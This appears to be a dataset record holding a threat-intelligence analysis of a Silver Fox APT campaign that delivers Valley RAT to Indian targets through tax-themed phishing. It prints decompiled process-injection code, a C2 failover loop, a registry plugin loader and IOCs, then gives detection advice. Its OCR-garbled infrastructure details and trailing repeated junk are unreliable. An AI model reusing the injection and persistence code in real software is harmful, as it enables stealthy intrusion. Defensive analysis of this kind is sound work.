shellcode is executed using a classic technique called Process Injection. The routine begins by verifying the presence of explorer.exe, which is later used as the target process. The binary is launched in suspended state and the malware retrieves the initial thread context. Further it allocates executable memory inside the remote process via VirtualAllocEx and writes the payload via WriteProcessMemory.  \n\nerrno_t LogStatus(char *Format, ...) \n\nerrno_t result; // eax \n\nint v2; // ecx \n\nsigned int Size; // kr00_4 \n\nvoid *Buffer_3; // edi \n\nsigned int i; // edx \n\nFILE *Stream; // [esp+Ch] [ebp-880h] BYREF \n\n_SYSTEMTIME SystemTime; // [esp+10h] [ebp-87Ch] BYREF \n\nchar Buffer[1024]; // [esp+20h] [ebp-86Ch] BYREF \n\nchar Buffer_2[1092]; // [esp+420h] [ebp-46Ch] BYREF \n\nchar Buffer_1[32]; // [esp+864h] [ebp-28h] BYREF \n\nva_list ArgList; // [esp+898h] [ebp+Ch] BYREF \n\nva_start(ArgList, Format); \n\nStream = 0; \n\nresult = fopen_s(&Stream, \"C:\\\\data.db\", \"ab+\"); \n\nif (!result && Stream) \n\nGetLocalTime(&SystemTime); \n\nsub_10003860(Buffer_1, \"[%04d-%02d-%02d %02d:%02d:%02d]\", SystemTime.wYear); \n\nsub_10001050(Buffer, v2, Format, v2, ArgList); \n\nsub_10003880(Buffer_2, \"%s%s\\n\", (char)Buffer_1); \n\nSize = strlen(Buffer_2); \n\nBuffer_3 = malloc(Size); \n\nif ( Buffer_3 ) \n\nmemcpy(Buffer_3, Buffer_2, Size); \n\nfor ( i = 0; i < Size; ++i ) \n\n*((_BYTE *)Buffer_3 + i) = 89 - (byte_10005A84[i & 7] ^ _ROL1_(*((_BYTE *)Buffer_3 + i), 2)); \n\nfwrite(Buffer_3, 1u, Size, Stream); \n\nfree(Buffer_3);<｜end▁of▁sentence｜>\n  \n\nThe LogStatus function implements an internal logging mechanism used throughout the DLL to record execution progress and error states. The function formats a timestamped log message, appends it to a local file (C:\\data.db), and applies a lightweight custom obfuscation before writing it to disk.\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n\n<center>Encrypted Payload in memory </center>  \n\nThe injected payload can be dumped by attaching a debugger to the hollowed explorer.exe process and monitoring the memory region allocated via VirtualAllocEx. Once the payload is written using WriteProcessMemory and execution is redirected, the allocated region can be dumped directly from memory, yielding the next stage payload for analysis.  \n\nE8 C0 C9 01 00 C0 C9 01 00 33 56 67 6A 66 95 EE 1AE..AE..3Vgif+1 87 5C F8 F3 F1 E1 9C 4D FE B8 FB 9E ED 69 D4 A2 +o6n6a0p,u- ii0c AF 92 B5 95 6C 05 E4 4C CF 00 00 00 00 OA 61 C2 \"u1.aII...aA E4 7A BA 59 20 00 CC 85 43 9D 07 BD 84 A1 72 64 azY..I..C..s,ird 87 8D F5 7D 2F 8B 4F BA 65 62 C1 4C 81 4C 42 AD +.6/0eBAL.LB. 4E CE 6F 33 67 E3 86 63 6B 37 39 8E 74 EA 1F 89 Nf03g4tck79Zte.k D1 AA 05 F0 14 E3 29 7E D7 19 CB 5E C3 96 14 6B N*.6.a)~x.E^A-k 9F 2F 0A 75 3C EF 0A EA 05 F8 1E 07 AD D0 81 6E Y/.uc1.e..D.n B8 2E F2 31 BF F5 FB 33 45 B8 7C 16 71 B6 40 D3 .0lz0u3E,1.qf0 70 68 0F B6 38 B9 33 F4 AE F4 60 6A 34 33 D3 4C ph.f8+3o0'j43OL CE 2E F9 08 0F F0 4C 2C E0 0C A7 EB F9 77 6D B5 I.u..6L,a.5eWmu 8F 96 C2 C9 18 01 63 E8 64 5A B4 CE E8 8E 14 BF -AE..cedz'feZ.z 85 BE FB CE F5 37 55 18 A3 FA 31 B2 7E 81 36 39 .n6f7U.fu1~.69 9A 70 DF 6E 59 F3 C2 63 78 81 48 51 DA 01 88 26 apBnY6Acx.HQU.^ 6A 15 E3 36 BA B2 CC 05 D1 63 F5 7A 1B DC D4 8F .6e+1.Nc0z.u0. 15 17 C8 B6 D7 06 8D 05 40 8A A5 38 38 D4 03 B7 .Ef..d5f80. BC AA AE D5 DF BF 0D 5A 14 EB E2 FB 2A 2D 03 16 +o0z.z.eaU~.  \n\nLooking through the decrypted payload we find that the final payload is a Donut generated shellcode. In this setup, Donut is used to wrap a managed payload into raw shellcode, allowing it to be executed entirely from memory without touching disk.  \n\nBinary \n\nShellcode: Donut(0.9.2)[x86] \n\nS ?<｜end▁of▁sentence｜>\n  \n\nWe can dump the Donut payload by using tools like undonut or donut- decryptor.  \n\n## Stage - 4 : Valley RAT  \n\nAfter the Donut loader successfully injects the final payload into the hollowed explorer.exe process, Valley RAT initializes its sophisticated configuration management subsystem. It starts off by setting anti analysis procedures and then invokes a function sub_405E40() to initialize it's configuration and later create a thread for C2 communication.\n\n<--- Page Split --->\nif (!byte_41DA8C ) \n\n{\n\nbyte_41DA8C = 1;\n\n_wcsrev(a0Db1k1Hs0ld0L);\n\nmemset(&src, 0, 0x12A0u);\n\nsub_405D70('L\"p1:\", Source, 0);\n\nsub_405D70('L\"o1:\", Source_2, 0);\n\nsub_405D70('L\"t1:\", 0, (int)&dword_41CA30);\n\nsub_405D70('L\"p2:\", Source_0, 0);\n\nsub_405D70('L\"o2:\", Source_1, 0);\n\nsub_405D70('L\"t2:\", 0, (int)&dword_41CC70);\n\nsub_405D70('L\"p3:\", Source_3, 0);\n\nsub_405D70('L\"o3:\", Source_4, 0);\n\nsub_405D70('L\"t3:\", 0, (int)&dword_41CE80);\n\nsub_405D70('L\"dd:\", word_41CEF0, 0);\n\nsub_405D70('L\"cl:\", word_41CF2C, 0);\n\nsub_405D70('L\"bb:\", &word_41CF4, 0);\n\nsub_405D70('L\"bb:\", &word_41CFF4, 0);\n\nsub_405D70('L\"jp:\", 0, (int)&unk_41D058);\n\nsub_405D70('L\"sx:\", 0, (int)&unk_41D05C);\n\nsub_405D70('L\"bh:\", 0, (int)&unk_41D060);\n\nsub_405D70('L\"ll:\", 0, (int)&unk_41D064);\n\nsub_405D70('L\"dl:\", 0, (int)&unk_41D06C);\n\nsub_405D70('L\"bd:\", 0, (int)&unk_41D074);\n\n//\"|0:db|1:1k|1:hs|0:1d|0:11|0:hb|1:pj|52.9 .5202:zb|0.1:bb|\"\n\n**Primary C2**\n\n**Tertiary C2**\n\n**Delay**\n\n**Interval**\n\n**Build Version**\n\n**Download**\n\n**Shell**\n\n**Keylogger**\n\n**Backdoor**<｜end▁of▁sentence｜>\n\n<center>C2 Configuration </center>  \n\nThe function implements a two stage loading mechanism. It extracts 22 distinct configuration parameters through a parsing function.  \n\n## Stage 1  \n\n## Command & Control Infrastructure (9 parameters):  \n\n- p1:, p2:, p3: - Three-tier C2 server addresses (correlates with b[.]yuxuanow[.]top identified in network analysis)- o1:, o2:, o3: - Corresponding port numbers for each C2 tier- t1:, t2:, t3: - Connection type flags (1 = HTTP/HTTPS, 0 = raw TCP socket)  \n\n## Operational Parameters (5 parameters):  \n\n- dd: - Initial sleep delay (seconds) before first C2 contact- cl: - Callback interval (seconds) between beaconing attempts- bb: - Build/bot version identifier (observed: 1.0)- bz: - Backup C2 address- fz: - Unknown parameter  \n\n## Feature Flags (8 boolean parameters):  \n\n- kl: - Keylogger (1 = enabled, 0 = disabled)- sh: - Remote shell access (1 = enabled, 0 = disabled)- bd: - Full backdoor mode (1 = enabled, 0 = disabled)- dl: - Download/file transfer capability- jp:, sx:, bh:, ll: - Additional feature toggles  \n\n## Stage 2  \n\nAfter loading the embedded configuration, Valley RAT queries the Windows registry for updated C2 infrastructure:\n\n<--- Page Split --->\ncbData = 0; \n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\", 0, KEY_READ, &phkResult))\nRegQueryValueExW(phkResult, L\"IpDate\", 0, &Type, 0, &cbData); \n\nif ( cbData > 0xA ) \n\nmemset( \n\na0Db1Lk1Hs0Ld0L, // \"|0:db|1:lk|1:hs|0:1d|0:11|0:hb|1:pj\n0, \n\n0x7D0u); \n\nRegQueryValueExW( \n\nphkResult, \n\nL\"IpDate\", \n\n0, \n\n&Type, \n\n(LPBYTE)a0Db1Lk1Hs0Ld0L, \n\n&cbData); \n\nsub_405D70(L\"p1:\", Source, 0); \n\nsub_405D70(L\"o1:\", Source_2, 0); \n\nsub_405D70(L\"t1:\", 0, &dword_41CA30); \n\nsub_405D70(L\"p2:\", Source_0, 0); \n\nsub_405D70(L\"o2:\", Source_1, 0); \n\nsub_405D70(L\"t2:\", 0, &dword_41CC70); \n\nsub_405D70(L\"p3:\", Source_3, 0); \n\nsub_405D70(L\"o3:\", Source_4, 0); \n\nsub_405D70(L\"t3:\", 0, &dword_41CEB0);<｜end▁of▁sentence｜>\n\n<center>Persistence </center>  \n\nIf the registry value exists and exceeds 10 bytes, Valley RAT completely replaces its embedded configuration, then re- parses only the critical C2 parameters (p1 through t3). This allows Silver Fox operators to push updated C2 addresses without deploying new binaries or regaining code execution  \n\nAfter the configuration is loaded. Valley RAT spawns its payload thread(StartAddress) which implements a 3 tier C2 communication loop.  \n\nwhile ( 1 ) \n\n{\n\nnullsub_1();\n\nif ( C2_TOGGLE_FLAG )\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p2_secondary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o2_secondary_c2);\n\nconnection_type_flag = config_t2_secondary_type;\n\nelse\n\n// Use Primary C2 Config\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p1_primary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o1_primary_port);\n\nconnection_type_flag = config_t1_primary_type;\n\nC2_TOGGLE_FLAG = C2_TOGGLE_FLAG == 0;\n\nif ( ++failed_connection_counter == 200 )\n\nnullsub_1();\n\nwcscpy_s(&current_c2_addr, 0xFFu, config_p3_tertiary_c2);\n\nwcscpy_s(&current_c2_port, 0x1Eu, config_o3_tertiary_port);\n\nconnection_type_flag = config_t3_tertiary_type;\n\nfailed_connection_counter = 0;\n\nif ( v2 )\n\n(**void (_thiscall ***)(void *))v2)(v2);\n\nv2 = (void *)v15;\n\nif ( connection_type_flag != 1 )<｜end▁of▁sentence｜>\n  \n\nThe communication loop implements multi- tier failover by alternating between primary (p1) and secondary (p2) C2 servers, switching to tertiary (p3) after 200 failures. It supports both HTTP/HTTPS and raw TCP protocols, uses configurable beaconing intervals (cl:) to reduce detection, and delays initial connection (dd:) to evade sandboxes.  \n\nUpon successful connection, Valley RAT sends a \"ready\" beacon (command ID: 4), enables keylogging if configured (kl: flag), and waits for C2 commands. This architecture maps to the discovered infrastructure: b[.jyuxuanow[.]top (103.20.195[.]147) as primary shellcode C2, with secondary/tertiary\n\n<--- Page Split --->\n\ntiers rotating through domains like itdd[.]club, gov- a[.]work, and xzghjec[.]com.  \n\nif (!RegCreateKeyW(HKEY_CURRENT_USER, L\"Console\\\\0\", &hKey)) \n\n{\n\nRegDeleteValueW(hKey, L\"d33f351a4aeea5e608853d1a56661059\");\n\nRegSetValueExW(hKey, L\"d33f351a4aeea5e608853d1a56661059\", 0, REG_BINARY, (const BYTE *)dst, cbData);\n\n}\n\nRegCloseKey(hKey);\n\noperator delete[](dst);\n\n}\n\nArgList_1 = ArgLista;\n\nv8 = _beginthreadex(0, 0, sub_4052C0, ArgLista, 0, 0);\n\ngoto LABEL_21;\n\ntype = 3;\n\nbData = 0;\n\nif (!RegOpenKeyExW(HKEY_CURRENT_USER, L\"Console\\\\0\", 0, KEY_READ, &phkResult))\n\nRegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, 0, &cbData);\n\nif ( cbData > 0xA44 )\n\ndst_1 = (char *)operator new[](cbData);\n\nmemset(dst_1, 0, cbData);\n\nif (!RegQueryValueExW(phkResult, L\"d33f351a4aeea5e608853d1a56661059\", 0, &Type, (LPBYTE)dst_1, &cbData))\n\n{\n\nqmemcpy(&dst_, dst_1, 0xA44u);\n\nlpAddress = VirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\nmemcpy_0(lpAddress, dst_1 + 2628, Size);\n\n}\n\nhKey_1 = hKey;\n\n}\n\nRegCloseKey(phkResult);\n\nArgList_1 = ArgLista;<｜end▁of▁sentence｜>\n  \n\nValley RAT implements a modular plugin architecture that enables dynamic capability extension through registry- based persistence. The malware stores downloaded plugins in HKCU\\Console\\0\\d33f351a4aeea5e608853d1a56661059 a registry value name consistent with Valley RAT's established fingerprint, following the MD5 hash naming convention observed across multiple Valley RAT campaigns. The plugin manager operates in two modes: it either receives modules from the C2 server, allocates executable memory with PAGE_EXECUTE_READWRITE permissions, and persists the 2628- byte configuration plus payload code to the registry as REG_BINARY data, or it retrieves previously stored plugins from the registry, validates them against a hardcoded signature, and spawns execution threads.  \n\nEach plugin includes a magic byte guard (0xC9) to prevent double- execution. This architecture allows Silver Fox operators to deploy specialized capabilities such as advanced keylogging, credential harvesting, or lateral movement modules on- demand to compromised systems, with automatic persistence across reboots through registry storage.  \n\nGetSystemDirectoryA(Buffer, @xFFu); \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\SysWOW64\\\\tracerpt.exe\"); \n\nif ( GetFileAttributesA(Buffer) == -1 ) \n\nBuffer[3] = 0; \n\nsub_4059F0(\"%s%s\", Buffer, \"Windows\\\\System32\\\\tracerpt.exe\"); \n\nresult = CreateProcessA(Buffer, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartupInfo, lpProcessInformation); \n\nif ( result ) \n\nlpBaseAddress = VirtualAllocEx( \n\nlpProcessInformation->hProcess, 0, \n\ndwSize, \n\nMEM_COMMIT | MEM_RESERVE, \n\nPAGE_EXECUTE_READWRITE); \n\nif ( lpBaseAddress \n\n&& WriteProcessMemory(lpProcessInformation->hProcess, lpBaseAddress, lpBuffer, dwSize, 0) \n\n&& (hThread = lpProcessInformation->hThread, Context.ContextFlags = 65543, GetThreadContext(hThread, &Context)) \n\n&& (hThread_1 = lpProcessInformation->hThread, \n\nContext.Eip = (DWORD)lpBaseAddress, \n\nSetThreadContext(hThread_1, &Context)) ) \n\n{ \n\nResumeThread(lpProcessInformation->hThread); \n\nreturn 1;<｜end▁of▁sentence｜>\n\n<center>Tracerpt Injection </center>  \n\nAfter downloading plugins from the C2 server, Valley RAT injects them into tracerpt.exe, a legitimate signed Microsoft utility, using the same process following. The malware creates the process in a suspended state, injects the plugin code into its memory, and redirects execution to the malicious payload. Before injection, it patches the plugin with the same 4768- byte configuration containing C2 addresses and feature flags analyzed earlier.  \n\n## Pivoting  \n\nLet's start with the C2 embedded within the decoy document \"ggwk[.]cc\".\n\n<--- Page Split --->\n<｜end▁of▁sentence｜>\n  \n\nThe C2 has 2 different titles over time, all of them in- line with the Income- tax- themed phishing lure, both from the same ASN. However, there's a common denominator - the favicon.  \n\n<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\nWe found 10+ domains that share the same favicon. If we look at the http response titles, we can see that all the titles are Income-tax-themed. The results can be validated against VT to discover additional samples from this campaign. Refer to the IOCs section below.  \n\n<｜end▁of▁sentence｜>\n  \n\n## Diamond Model  \n\n## ADVERSARY \n\nThreat Actor: Silver Fox APT \n\nAttribution Confidence: High \n\nRationale: \n\nRaze of income-tax-themed lures previously observed in Silver Fox operations \n\nNGSI = signed binary DLL hijacking = Donut schedule chain consistent with Chinese APT toolchain \n\nMotivations: Espionage / long-term access \n\nSophistication: High (anti-analysis, in-memory execution, living-off-the-land abuse) \n\n## VICTIM \n\n### Target Profile \n\nIndian enterprises and users \n\nFrance, tax, and business-relevant personas \n\n### Exposures \n\nUser-level compromise escalating to persistent RAT control \n\nLong dwell time risk due to stealthy registry persistence \n\n### Operational Risk \n\nSilent surveillance \n\nCredential theft \n\nSelective deployment of high-risk modules only when needed \n\n## Silver Fox APT - IncomeTax Campaign \n\n### CAPABILITY \n\n### Initial Access \n\nPhishing with government-themed PDF lure \n\n### Execution & Loader Chain \n\nNESS installer \n\nSigned binary DLL hijacking \n\nProcess hooking into explorer.exe \n\nDonut-generated in-memory loader \n\n### Stage 4: Valley RAT Core \n\nTwo-stage configuration system (embedded + registry override) \n\n22-parameter operational config \n\nMulti-tier CI loop with protocol switching \n\n### Post-Compromise Capabilities \n\nKeylogging (M) \n\nInteractive shell (sh) \n\nFile download / upload (df) \n\nFull backdoor mode (xd) \n\n### Modular Expansion \n\nPlugin delivery via CI \n\nIn-memory execution + registry persistence \n\nPlugin integrity checks and execution guards \n\n## INFRASTRUCTURE \n\nInitial Redirect / Decoy Hosting \n\ngop@.ix \n\nIP: 45.207.231.94 \n\nCommand & Control \n\nN: [yuxuanow].top \n\nIP: 103.20.199.2147 \n\nPlotted Infrastructure (Shared Favorites / Patrolled Domains) \n\nlald.club = 45.207.231.107 \n\ngov=work, gov=a.fh, gov=a.club, gov=c.club, gov.club, gov=b.club = 160.124.3.103 \n\nxqghw.com = 8.217.9.165 \n\ndngtaki.cn = 47.239.225.43 \n\nhiko.cn, kiyoi.club, hhmm.wark = 43.100.22.158 \n\nsec2020gb.cn, 2025wmm.cn = 43.100.123.207 \n\nhiko.wark = 43.100.63.145 \n\n### ASN reuse over time: AS112839, AS149801 \n\n### Design Characteristics \n\nThree-tier failover with retry thresholds (200 failures) \n\nMixed protocol support (HTTPs) + two TCPs \n\nRegistry-driven dynamic CI updates \n\nResilience Features<｜end▁of▁sentence｜>\n\n\n<--- Page Split --->\n\n## Impact  \n\nHigh risk of long- term undetected compromise: Registry- resident plugins and delayed beaconing allow the RAT to survive reboots while remaining low- noise. Dynamic threat evolution post- infection: Attackers can upgrade capabilities (keylogging, credential theft, lateral movement) without taking initial access again or malware redeployment. Infrastructure- based blocking is brittle: Tiered C2 failover and protocol switching reduce the effectiveness of static IP/domain blocking. Reduced visibility for incident response: In- memory execution combined with registry- based persistence complicates timeline reconstruction and malware eradication. Elevated data security risk: On- demand module delivery enables targeted credential harvesting and surveillance tailored to victim role and value.  \n\n## Recommendations  \n\nMonitor registry abuse as a persistence layer: Alert on executable REG_BINARY blobs and anomalous values under non- standard paths such as HKCU\\Console\\*, especially those written by user processes. Detect multi- tier C2 logic, not just domains: Build detections for retry- heavy outbound connections, protocol switching (HTTP \\(\\leftrightarrow\\) raw TCP), delayed first beacon, and repeated failures followed by fallback behavior. Instrument memory- permission anomalies: Alert on processes allocating PAGE_EXECUTE_READWRITE memory followed by thread creation, particularly inside explorer.exe. Hunt for signed binary + local DLL load patterns: Correlate execution of signed binaries from temp directories with unsigned DLL loads and immediate child thread creation. Treat RAT feature enablement as an alerting signal: Monitor sudden activation of keylogging APIs, interactive shell behavior, or file transfer operations within long- running, previously quiet processes.  \n\n## Appendix  \n\n## IOCs  \n\n<table><tr><td>Indicator Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Sha256 Hash</td><td>77ea62ff74a66f61a511eb6b6edac20be9822fa9cc1e7354a8cd6379c7b9d2d2</td><td>Stage 1</td></tr><tr><td>Sha256 Hash</td><td>fa388a6cdd28ad5dd83acd674483828251f21cbefaa801e839ba39af24a6ac19</td><td>Stage 2</td></tr><tr><td>Sha256 Hash</td><td>f74017b406e993bea5212615febe23198b09ecd73ab79411a9f6571ba1f94cfa</td><td>Stage 3</td></tr><tr><td>Sha256 Hash</td><td>068e49e734c2c7be4fb3f01a40bb8beb2d5f4677872fabbed7741245a7ea97c</td><td>Stage 4</td></tr><tr><td>Domain</td><td>ggwk[.]cc</td><td>Embedded<br>Domain Within<br>Decoy Attachment</td></tr></table>\n\n<--- Page Split --->\n\n\n<table><tr><td>Indicator<br>Type</td><td>Indicator</td><td>Comments</td></tr><tr><td>Domain</td><td>b[.]yuxuanow[.]top</td><td>Shellcode C2</td></tr><tr><td>IP</td><td>45.207.231[.]94</td><td>Resolution from<br>ggwk[.]cc</td></tr><tr><td>IP</td><td>103.20.195[.]147</td><td>Resolution from<br>b[.]yuxuanow[.]top</td></tr></table>", "format_code": "DeleteFileA(FileName);", "hash": "hash"}
{"file_name": "fed9c11a-b86a-49a9-a9e2-24332f01a81c.md", "title": "Silver Fox Targeting India Using Tax Themed Phishing Lures", "malicious_code": "CreateDirectoryA(PathName, 0);  \nSetCurrentDirectoryA(PathName);", "describe": "cloudsek.com/blog/silver- fox- targeting- india- using- tax- themed- phishing- lures  \n\nPrajwal Awasthi  \n\nTable of Content  \n\nSubscribe to CloudSEK Resources  \n\nGet the latest industry news, threats and resources.  \n\n## Executive Summary  \n\nCloudSEK's TRIAD discovered a campaign by Silver Fox APT targeting India with Income tax themed phishing lures. The lure is visually identical to the ones discovered by other vendors, however, this campaign has not been attributed to a specific threat actor before this report. Attribution accuracy is critical to threat intelligence; it enables defenders to predict adversary behavior and deploy targeted countermeasures. Misattribution from trusted sources propagates through threat feeds and detection systems, causing organizations to focus on the wrong threat while the actual adversary operates undetected. Attributing this campaign to SideWinder APT (India- aligned) contradicts basic victimology and creates systemic confusion. Using our report aims to highlight the sophisticated kill chain by the Chinese APT group, and explains the rationale behind CloudSEK's attribution.  \n\n## Kill Chain  \n\n<｜end▁of▁sentence｜>\n  \n\n## Initial Access Vector  \n\nTOPSOE INDIA PRIVATE LIMITED \n\n \n\nस्वरोचन ने अधिकार - Allgate/1/6/6/6/6/6/6/6/6/6/6/1/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1/1/1/1/1/1/6/6/6/6/6/6/6/6/6/6/1/1/1/1/1